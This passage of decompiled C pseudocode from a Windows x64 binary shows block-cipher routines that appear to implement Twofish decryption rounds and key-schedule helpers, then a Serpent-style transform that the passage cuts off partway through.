  unsigned int v40; // er13
  int v41; // er10
  int v42; // er9
  int v43; // er8
  unsigned int v44; // er12
  int v45; // er11
  int v46; // eax
  int v47; // er9
  int v48; // er8
  unsigned int v49; // er13
  int v50; // ebx
  int v51; // er9
  int v52; // er8
  int v53; // er10
  unsigned int v54; // er12
  int v55; // er9
  int v56; // er8
  unsigned int v57; // er13
  int v58; // er11
  int v59; // er9
  int v60; // er8
  int v61; // ebx
  unsigned int v62; // er12
  int v63; // er9
  int v64; // er8
  unsigned int v65; // er13
  int v66; // er10
  int v67; // er9
  int v68; // er8
  unsigned int v69; // er12
  int v70; // er11
  int v71; // er9
  int v72; // er11
  int v73; // er9
  int v74; // er8
  int v75; // ecx
  __int64 v76; // rax
  int v77; // er12
  int v78; // er8
  unsigned int v79; // eax
  int v80; // er13
  int v81; // edx
  int v82; // ecx
  int v83; // ecx
  int v84; // ecx
  unsigned int *v85; // r14
  __int64 result; // rax

  v4 = *(_QWORD *)(a1 + 4312);
  v5 = *(_DWORD **)(a1 + 192);
  v6 = a2[1] ^ v5[5];
  v7 = *a2 ^ v5[4];
  v8 = a4;
  v9 = a3;
  v10 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v6)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v6 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v6) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v6) + 768));
  v11 = v10
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v7) ^ *(_DWORD *)(v4
                                                                  + 4i64
                                                                  * ((unsigned int)(unsigned __int8)((unsigned __int16)(*(_WORD *)a2 ^ *((_WORD *)v5 + 8)) >> 8)
                                                                   + 256)) ^ *(_DWORD *)(v4
                                                                                       + 4i64
                                                                                       * ((unsigned int)BYTE2(v7) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v7 >> 24) + 768)));
  v12 = (v11 + v5[38]) ^ __ROL4__(a2[2] ^ v5[6], 1);
  v13 = __ROR4__(a2[3] ^ v5[7] ^ (v11 + v10 + v5[39]), 1);
  v14 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v13)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v13 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v13) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v13) + 768));
  v15 = v14
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v12) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v12) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v12) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v12 >> 24) + 768)));
  v16 = (v15 + v5[36]) ^ __ROL4__(v7, 1);
  v17 = __ROR4__(v6 ^ (v15 + v14 + v5[37]), 1);
  v18 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v17)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v17 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v17) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v17) + 768));
  v19 = v18
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v16) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v16) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v16) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v16 >> 24) + 768)));
  v20 = (v19 + v5[34]) ^ __ROL4__(v12, 1);
  v21 = __ROR4__(v13 ^ (v19 + v18 + v5[35]), 1);
  v22 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v21)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v21 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v21) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v21) + 768));
  v23 = v22
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v20) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v20) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v20) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v20 >> 24) + 768)));
  v24 = (v23 + v5[32]) ^ __ROL4__(v16, 1);
  v25 = __ROR4__(v17 ^ (v23 + v22 + v5[33]), 1);
  v26 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v25)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v25 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v25) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v25) + 768));
  v27 = v26
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v24) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v24) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v24) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v24 >> 24) + 768)));
  v28 = (v27 + v5[30]) ^ __ROL4__(v20, 1);
  v29 = __ROR4__(v21 ^ (v27 + v26 + v5[31]), 1);
  v30 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v29)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v29 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v29) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v29) + 768));
  v31 = v30
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v28) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v28) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v28) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v28 >> 24) + 768)));
  v32 = (v31 + v5[28]) ^ __ROL4__(v24, 1);
  v33 = __ROR4__(v25 ^ (v31 + v30 + v5[29]), 1);
  v34 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v33)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v33 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v33) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v33) + 768));
  v35 = v34
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v32) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v32) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v32) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v32 >> 24) + 768)));
  v36 = (v35 + v5[26]) ^ __ROL4__(v28, 1);
  v37 = __ROR4__(v29 ^ (v35 + v34 + v5[27]), 1);
  v38 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v37)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v37 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v37) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v37) + 768));
  v39 = v38
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v36) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v36) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v36) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v36 >> 24) + 768)));
  v40 = (v39 + v5[24]) ^ __ROL4__(v32, 1);
  v41 = __ROR4__(v33 ^ (v39 + v38 + v5[25]), 1);
  v42 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v41)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v41 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v41) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v41) + 768));
  v43 = v42
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v40) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v40) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v40) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v40 >> 24) + 768)));
  v44 = (v43 + v5[22]) ^ __ROL4__(v36, 1);
  v45 = __ROR4__(v37 ^ (v43 + v42 + v5[23]), 1);
  v46 = __ROR4__(v37 ^ (v43 + v42 + v5[23]), 1);
  v47 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v45)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v45 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v46) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v45) + 768));
  v48 = v47
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v44) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v44) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v44) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v44 >> 24) + 768)));
  v49 = (v48 + v5[20]) ^ __ROL4__(v40, 1);
  v50 = __ROR4__(v41 ^ (v48 + v47 + v5[21]), 1);
  v51 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v50)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v50 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v50) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v50) + 768));
  v52 = v51
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v49) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v49) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v49) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v49 >> 24) + 768)));
  v53 = __ROR4__(v45 ^ (v52 + v51 + v5[19]), 1);
  v54 = (v52 + v5[18]) ^ __ROL4__(v44, 1);
  v55 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v53)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v53 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v53) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v53) + 768));
  v56 = v55
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v54) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v54) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v54) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v54 >> 24) + 768)));
  v57 = (v56 + v5[16]) ^ __ROL4__(v49, 1);
  v58 = __ROR4__(v50 ^ (v56 + v55 + v5[17]), 1);
  v59 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v58)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v58 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v58) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v58) + 768));
  v60 = v59
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v57) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v57) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v57) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v57 >> 24) + 768)));
  v61 = __ROR4__(v53 ^ (v60 + v59 + v5[15]), 1);
  v62 = (v60 + v5[14]) ^ __ROL4__(v54, 1);
  v63 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v61)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v61 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v61) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v61) + 768));
  v64 = v63
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v62) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v62) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v62) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v62 >> 24) + 768)));
  v65 = (v64 + v5[12]) ^ __ROL4__(v57, 1);
  v66 = __ROR4__(v58 ^ (v64 + v63 + v5[13]), 1);
  v67 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v66)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v66 + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v66) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v66) + 768));
  v68 = v67
      + (*(_DWORD *)(v4 + 4i64 * (unsigned __int8)v65) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE1(v65) + 256)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v65) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v65 >> 24) + 768)));
  v69 = (v68 + v5[10]) ^ __ROL4__(v62, 1);
  v70 = __ROR4__(v61 ^ (v68 + v67 + v5[11]), 1);
  v71 = *(_DWORD *)(v4 + 4i64 * ((unsigned int)(unsigned __int8)v70 + 256)) ^ *(_DWORD *)(v4
                                                                                        + 4i64
                                                                                        * ((unsigned int)BYTE1(v70) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v70) + 768));
  HIBYTE(v46) = HIBYTE(v70);
  v72 = v5[1] ^ v70;
  v73 = *(_DWORD *)(v4 + 4i64 * HIBYTE(v46)) ^ v71;
  v74 = *(_DWORD *)(v4 + 4i64 * ((unsigned int)BYTE2(v69) + 512)) ^ *(_DWORD *)(v4 + 4i64 * ((v69 >> 24) + 768));
  v75 = BYTE1(v69);
  v76 = (unsigned __int8)v69;
  v77 = *v5 ^ v69;
  v78 = v73 + (*(_DWORD *)(v4 + 4 * v76) ^ *(_DWORD *)(v4 + 4i64 * (unsigned int)(v75 + 256)) ^ v74);
  v79 = 0;
  v80 = v5[2] ^ (v78 + v5[8]) ^ __ROL4__(v65, 1);
  v81 = v5[3] ^ __ROR4__(v66 ^ (v78 + v73 + v5[9]), 1);
  if ( v9 )
    v82 = *v9;
  else
    v82 = 0;
  *v8 = v82 ^ v77;
  if ( v9 && ++v9 != 0i64 )
    v83 = *v9;
  else
    v83 = 0;
  v8[1] = v72 ^ v83;
  if ( v9 && ++v9 != 0i64 )
    v84 = *v9;
  else
    v84 = 0;
  v8[2] = v80 ^ v84;
  if ( v9 )
  {
    v85 = (unsigned int *)(v9 + 1);
    if ( v85 )
      v79 = *v85;
  }
  result = v81 ^ v79;
  v8[3] = result;
  return result;
}

//----- (000000014008DBE0) ----------------------------------------------------
__int64 __fastcall sub_14008DBE0(unsigned int a1, unsigned int a2)
{
  unsigned int v2; // er10
  unsigned int v3; // er9
  int v4; // er8
  unsigned int v5; // ebx
  int v6; // ecx
  unsigned int v7; // er11
  unsigned int v8; // er8
  int v9; // edx
  unsigned int v10; // er9
  unsigned int v11; // er8
  int v12; // edx
  unsigned int v13; // er10
  unsigned int v14; // er8
  int v15; // edx
  unsigned int v16; // eax
  unsigned int v17; // er9
  unsigned int v18; // er8
  int v19; // edx
  unsigned int v20; // eax
  unsigned int v21; // er10
  unsigned int v22; // er8
  int v23; // edx
  unsigned int v24; // eax
  unsigned int v25; // er9
  unsigned int v26; // er8
  int v27; // edx
  unsigned int v28; // er10
  unsigned int v29; // er8
  int v30; // edx

  v2 = a1;
  v3 = a1 >> 24;
  v4 = 2 * (a1 >> 24) ^ ((a1 & 0x80000000) != 0 ? 0x14D : 0);
  v5 = a2 << 8;
  v6 = v4 ^ (a1 >> 25) ^ ((a1 & 0x1000000) != 0 ? 0xA6 : 0);
  v7 = (v2 << 8) ^ (a2 >> 24) ^ (v3 | ((v6 | ((v4 | (v6 << 8)) << 8)) << 8));
  v8 = v7 >> 24;
  v9 = 2 * (v7 >> 24) ^ ((v7 & 0x80000000) != 0 ? 0x14D : 0);
  v10 = (v7 << 8) ^ (v5 >> 24) ^ (v8 | ((v9 ^ (v8 >> 1) ^ ((v8 & 1) != 0 ? 0xA6 : 0) | ((v9 | ((v9 ^ (v8 >> 1) ^ ((v8 & 1) != 0 ? 0xA6 : 0)) << 8)) << 8)) << 8));
  v11 = v10 >> 24;
  v12 = 2 * (v10 >> 24) ^ ((v10 & 0x80000000) != 0 ? 0x14D : 0);
  v13 = (v10 << 8) ^ ((unsigned __int64)(v5 << 8) >> 24) ^ (v11 | ((v12 ^ (v11 >> 1) ^ ((v11 & 1) != 0 ? 0xA6 : 0) | ((v12 | ((v12 ^ (v11 >> 1) ^ ((v11 & 1) != 0 ? 0xA6 : 0)) << 8)) << 8)) << 8));
  v14 = v13 >> 24;
  v15 = 2 * (v13 >> 24) ^ ((v13 & 0x80000000) != 0 ? 0x14D : 0);
  v16 = v5 << 16;
  v5 <<= 24;
  v17 = (v13 << 8) ^ (v16 >> 24) ^ (v14 | ((v15 ^ (v14 >> 1) ^ ((v14 & 1) != 0 ? 0xA6 : 0) | ((v15 | ((v15 ^ (v14 >> 1) ^ ((v14 & 1) != 0 ? 0xA6 : 0)) << 8)) << 8)) << 8));
  v18 = v17 >> 24;
  v19 = 2 * (v17 >> 24) ^ ((v17 & 0x80000000) != 0 ? 0x14D : 0);
  v20 = v5;
  v5 <<= 8;
  v21 = (v17 << 8) ^ (v20 >> 24) ^ (v18 | ((v19 ^ (v18 >> 1) ^ ((v18 & 1) != 0 ? 0xA6 : 0) | ((v19 | ((v19 ^ (v18 >> 1) ^ ((v18 & 1) != 0 ? 0xA6 : 0)) << 8)) << 8)) << 8));
  v22 = v21 >> 24;
  v23 = 2 * (v21 >> 24) ^ ((v21 & 0x80000000) != 0 ? 0x14D : 0);
  v24 = v5;
  v5 <<= 8;
  v25 = (v21 << 8) ^ (v24 >> 24) ^ (v22 | ((v23 ^ (v22 >> 1) ^ ((v22 & 1) != 0 ? 0xA6 : 0) | ((v23 | ((v23 ^ (v22 >> 1) ^ ((v22 & 1) != 0 ? 0xA6 : 0)) << 8)) << 8)) << 8));
  v26 = v25 >> 24;
  v27 = 2 * (v25 >> 24) ^ ((v25 & 0x80000000) != 0 ? 0x14D : 0);
  v28 = (v25 << 8) ^ (v5 >> 24) ^ (v26 | ((v27 ^ (v26 >> 1) ^ ((v26 & 1) != 0 ? 0xA6 : 0) | ((v27 | ((v27 ^ (v26 >> 1) ^ ((v26 & 1) != 0 ? 0xA6 : 0)) << 8)) << 8)) << 8));
  v29 = v28 >> 24;
  v30 = 2 * (v28 >> 24) ^ ((v28 & 0x80000000) != 0 ? 0x14D : 0);
  return (v28 << 8) ^ BYTE2(v5) ^ (v29 | ((v30 ^ (v29 >> 1) ^ ((v29 & 1) != 0 ? 0xA6 : 0) | ((v30 | ((v30 ^ (v29 >> 1) ^ ((v29 & 1) != 0 ? 0xA6 : 0)) << 8)) << 8)) << 8));
}

//----- (000000014008E1C0) ----------------------------------------------------
__int64 __fastcall sub_14008E1C0(unsigned int a1, __int64 a2, int a3)
{
  unsigned int v3; // er10
  int v4; // er8
  int v5; // er8
  __int64 result; // rax

  v3 = ((a1 | ((a1 | (a1 << 8)) << 8)) << 8) | a1;
  v4 = a3 - 2;
  if ( v4 )
  {
    v5 = v4 - 1;
    if ( v5 )
    {
      result = v3;
      if ( v5 != 1 )
        return result;
      v3 = *(_DWORD *)(a2 + 24) ^ byte_1400B53B0[(unsigned __int8)a1 + 256] ^ ((byte_1400B53B0[BYTE1(v3)] ^ ((byte_1400B53B0[(unsigned __int8)((((a1 | ((a1 | (a1 << 8)) << 8)) << 8) | a1) >> 16)] ^ (byte_1400B53B0[BYTE3(result) + 256] << 8)) << 8)) << 8);
    }
    v3 = *(_DWORD *)(a2 + 16) ^ byte_1400B53B0[(unsigned __int8)v3 + 256] ^ ((byte_1400B53B0[BYTE1(v3) + 256] ^ ((byte_1400B53B0[BYTE2(v3)] ^ (byte_1400B53B0[HIBYTE(v3)] << 8)) << 8)) << 8);
  }
  byte_1400B53B0[BYTE2(v3)];
  byte_1400B53B0[BYTE1(v3) + 256];
  return *(_DWORD *)a2 ^ byte_1400B53B0[(unsigned __int8)(*(_BYTE *)(a2 + 8) ^ byte_1400B53B0[(unsigned __int8)v3])] ^ ((((byte_1400B53B0[(unsigned __int8)((*(_DWORD *)(a2 + 8) ^ byte_1400B53B0[(unsigned __int8)v3] ^ ((byte_1400B53B0[BYTE1(v3) + 256] ^ ((byte_1400B53B0[BYTE2(v3)] ^ ((unsigned int)byte_1400B53B0[HIBYTE(v3) + 256] << 8)) << 8)) << 8)) >> 16) + 256] ^ (byte_1400B53B0[((*(_DWORD *)(a2 + 8) ^ byte_1400B53B0[(unsigned __int8)v3] ^ ((byte_1400B53B0[BYTE1(v3) + 256] ^ ((byte_1400B53B0[BYTE2(v3)] ^ ((unsigned int)byte_1400B53B0[HIBYTE(v3) + 256] << 8)) << 8)) << 8)) >> 24) + 256] << 8)) << 8) ^ (unsigned int)byte_1400B53B0[(unsigned __int16)(*(_WORD *)(a2 + 8) ^ byte_1400B53B0[(unsigned __int8)v3] ^ (unsigned __int16)((byte_1400B53B0[BYTE1(v3) + 256] ^ (unsigned __int16)((byte_1400B53B0[BYTE2(v3)] ^ (unsigned __int16)(byte_1400B53B0[HIBYTE(v3) + 256] << 8)) << 8)) << 8)) >> 8]) << 8);
}

//----- (000000014008E340) ----------------------------------------------------
__int64 __fastcall sub_14008E340(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v2; // rdx
  __int64 result; // rax
  __int64 i; // rcx

  v1 = *(_DWORD **)(a1 + 48);
  v2 = *(_QWORD *)(a1 + 40);
  if ( v1 == (_DWORD *)a1 )
  {
    *(_BYTE *)(a1 + 33) = 0;
    result = 0i64;
    for ( i = v2; i; --i )
    {
      *v1 = 0;
      ++v1;
    }
  }
  return result;
}

//----- (000000014008E370) ----------------------------------------------------
__int64 __fastcall sub_14008E370(__int64 a1, _DWORD *a2, int *a3, int *a4)
{
  _DWORD *v4; // rbp
  int *v5; // r14
  int v6; // ecx
  int v7; // er10
  int v8; // eax
  int v9; // er9
  _DWORD *v10; // rbp
  int v11; // esi
  int v12; // er10
  int v13; // esi
  int v14; // eax
  int v15; // er9
  int v16; // ecx
  int v17; // er10
  int v18; // eax
  int v19; // er10
  int v20; // ecx
  int v21; // er10
  int v22; // esi
  int v23; // edi
  int v24; // ebx
  int v25; // esi
  int v26; // edi
  int v27; // esi
  int v28; // ebx
  int v29; // er11
  int v30; // esi
  int v31; // edx
  int v32; // edi
  int v33; // esi
  int v34; // ebx
  int v35; // edx
  int v36; // er10
  int v37; // esi
  int v38; // ebx
  int v39; // ecx
  int v40; // eax
  int v41; // er10
  int v42; // er9
  int v43; // ebx
  int v44; // edx
  int v45; // er9
  int v46; // er10
  int v47; // er9
  int v48; // er10
  int v49; // ebx
  int v50; // eax
  int v51; // er9
  int v52; // ebx
  int v53; // ecx
  int v54; // er9
  int v55; // ebx
  int v56; // ecx
  int v57; // eax
  int v58; // er9
  int v59; // eax
  int v60; // edx
  int v61; // er10
  int v62; // er11
  int v63; // ebx
  int v64; // edx
  int v65; // ecx
  int v66; // edx
  int v67; // er10
  int v68; // er11
  int v69; // ebx
  int v70; // eax
  int v71; // ebx
  int v72; // er10
  int v73; // ebx
  int v74; // ecx
  int v75; // er11
  int v76; // edx
  int v77; // er9
  int v78; // ebx
  int v79; // edx
  int v80; // er11
  int v81; // eax
  int v82; // er9
  int v83; // edi
  int v84; // ebx
  int v85; // eax
  int v86; // ebx
  int v87; // ecx
  int v88; // er9
  int v89; // eax
  int v90; // er9
  int v91; // ebx
  int v92; // edi
  int v93; // er9
  int v94; // ebx
  int v95; // er11
  int v96; // er9
  int v97; // edi
  int v98; // ebx
  int v99; // er11
  int v100; // ebx
  int v101; // edi
  int v102; // er10
  int v103; // edx
  int v104; // er11
  int v105; // edi
  int v106; // er10
  int v107; // er11
  int v108; // eax
  int v109; // edi
  int v110; // er10
  int v111; // ecx
  int v112; // esi
  int v113; // eax
  int v114; // edi
  int v115; // er10
  int v116; // edx
  int v117; // edi
  int v118; // eax
  int v119; // er11
  int v120; // edi
  int v121; // esi
  int v122; // er11
  int v123; // esi
  int v124; // er11
  int v125; // edi
  int v126; // edx
  int v127; // edi
  int v128; // er11
  int v129; // ecx
  int v130; // er9
  int v131; // er11
  int v132; // esi
  int v133; // edx
  int v134; // er9
  int v135; // er11
  int v136; // ecx
  signed int v137; // er15
  int v138; // eax
  int v139; // ecx
  int v140; // edx
  int v141; // er9
  int v142; // eax
  int v143; // esi
  int v144; // er11
  int v145; // esi
  int v146; // er9
  int v147; // edx
  int v148; // esi
  int v149; // ecx
  int v150; // er9
  int v151; // er11
  int v152; // edx
  int v153; // esi
  int v154; // esi
  int v155; // ebx
  int v156; // er11
  int v157; // er9
  int v158; // ebx
  int v159; // esi
  int v160; // edx
  int v161; // esi
  int v162; // er11
  int v163; // er9
  int v164; // er11
  int v165; // edx
  int v166; // er11
  int v167; // ebx
  int v168; // er10
  int v169; // esi
  int v170; // ebx
  int v171; // er10
  int v172; // ebx
  int v173; // ecx
  int v174; // er9
  int v175; // ebx
  int v176; // er10
  int v177; // er9
  int v178; // edx
  int v179; // ebx
  int v180; // edx
  int v181; // er11
  int v182; // ebx
  int v183; // er9
  int v184; // ecx
  int v185; // eax
  int v186; // er11
  int v187; // er9
  int v188; // ebx
  int v189; // edx
  int v190; // er9
  int v191; // er11
  int v192; // er9
  int v193; // er11
  int v194; // ebx
  int v195; // eax
  int v196; // er9
  int v197; // ebx
  int v198; // ecx
  int v199; // er9
  int v200; // ebx
  int v201; // ecx
  int v202; // eax
  int v203; // er9
  int v204; // eax
  int v205; // edx
  int v206; // er10
  int v207; // er11
  int v208; // ebx
  int v209; // edx
  int v210; // ecx
  int v211; // edx
  int v212; // er10
  int v213; // er11
  int v214; // ebx
  int v215; // eax
  int v216; // ebx
  int v217; // er10
  int v218; // ebx
  int v219; // ecx
  int v220; // er11
  int v221; // ecx
  int v222; // edx
  int v223; // ebx
  int v224; // er9
  int v225; // er11
  int v226; // edx
  int v227; // eax
  int v228; // er9
  int v229; // edi
  int v230; // ebx
  int v231; // eax
  int v232; // ebx
  int v233; // ecx
  int v234; // er9
  int v235; // eax
  int v236; // er9
  int v237; // ebx
  int v238; // edi
  int v239; // er9
  int v240; // ebx
  int v241; // er11
  int v242; // er9
  int v243; // edi
  int v244; // ebx
  int v245; // er11
  int v246; // ebx
  int v247; // edi
  int v248; // er10
  int v249; // edx
  int v250; // er11
  int v251; // edx
  int v252; // edi
  int v253; // er10
  int v254; // edi
  int v255; // eax
  int v256; // edi
  int v257; // esi
  int v258; // er10
  int v259; // ecx
  int v260; // esi
  int v261; // eax
  int v262; // edi
  int v263; // edx
  int v264; // er10
  int v265; // edi
  int v266; // edx
  int v267; // eax
  int v268; // er11
  int v269; // edi
  int v270; // esi
  int v271; // er11
  int v272; // esi
  int v273; // er11
  int v274; // edi
  int v275; // edx
  int v276; // edi
  int v277; // er11
  int v278; // ecx
  int v279; // er9
  int v280; // esi
  int v281; // er11
  int v282; // edx
  int v283; // er11
  int v284; // er9
  int v285; // ecx
  int v286; // er11
  int v287; // eax
  int v288; // ecx
  int v289; // edx
  int v290; // er9
  int v291; // eax
  int v292; // esi
  int v293; // esi
  int v294; // eax
  unsigned int v295; // eax
  int v296; // ecx
  int v297; // ecx
  int v298; // ecx
  unsigned int *v299; // r8
  __int64 result; // rax

  v4 = *(_DWORD **)(a1 + 560);
  v5 = a4;
  v6 = a2[1] ^ v4[129];
  v7 = a2[2] ^ v4[130];
  v8 = *a2 ^ v4[128];
  v9 = a2[3] ^ v4[131];
  v10 = v4 + 96;
  v11 = v7;
  v12 = v8 ^ v7;
  v13 = v9 | v11;
  v14 = v9 & v8;
  v15 = v13 & (v6 ^ v9);
  v16 = v14 | v6;
  v17 = ~v12;
  v18 = v17 ^ v14;
  v19 = v13 & v17;
  v20 = v19 ^ v16;
  v21 = v18 ^ v19;
  v22 = v20 ^ v13;
  v23 = v15 ^ (v18 | v21);
  v24 = v22 ^ v15 ^ v10[28];
  v25 = v23 | v22;
  v26 = v10[29] ^ v23;
  v27 = v10[31] ^ v21 ^ v25;
  v28 = v26 ^ v27 ^ __ROR4__(v21 ^ v24, 5);
  v29 = v27 ^ (v26 << 7) ^ __ROR4__(v20 ^ v10[30], 22);
  v30 = v29 ^ 8 * v28 ^ __ROR4__(v27, 7);
  v31 = v30;
  v32 = v29 ^ v28 ^ __ROR4__(v26, 1);
  v33 = v32 ^ v30;
  v29 = __ROR4__(v29, 3);
  v34 = v29 ^ __ROR4__(v28, 13);
  v35 = v34 | v29 ^ v31;
  v36 = v33 ^ ~(v29 & v34);
  v37 = v35 ^ v33;
  v38 = v36 ^ v34;
  v39 = v38 ^ v32 & v37;
  v40 = v36 | v38 ^ v37;
  v41 = v10[25] ^ v36;
  v42 = v39 ^ v37 ^ v10[27];
